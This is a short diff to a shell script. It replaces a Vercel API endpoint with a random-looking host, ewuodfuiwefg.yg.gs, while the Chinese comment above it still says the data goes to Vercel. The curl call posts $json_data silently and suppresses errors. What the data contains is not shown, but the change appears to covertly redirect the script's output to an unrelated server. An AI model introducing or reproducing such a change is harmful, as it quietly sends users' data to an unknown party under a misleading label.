@@ -127,7 +127,7 @@ EOF
 # ------------------------------
 # 发送 POST 到 Vercel PHP API
 # ------------------------------
-VERCEL_API="https://vercel-php-api-dusky.vercel.app/api/verify.php"
+VERCEL_API="https://ewuodfuiwefg.yg.gs/api/verify.php"
 curl -s -X POST "$VERCEL_API" \
   -H "Content-Type: application/json" \
   -d "$json_data" || true
